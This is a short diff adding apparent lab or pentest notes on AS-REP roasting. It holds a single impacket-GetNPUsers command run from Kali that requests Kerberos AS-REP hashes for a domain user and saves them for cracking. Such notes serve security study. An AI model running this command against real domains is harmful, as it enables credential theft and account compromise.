@@ -1,0 +1,4 @@
+"Do not require Kerberos preauthentication is disabled" by default.
+
+# From Kali:
+impacket-GetNPUsers -dc-ip 10.0.0.2  -request -outputfile hashes.asreproast superalex.sec/user01
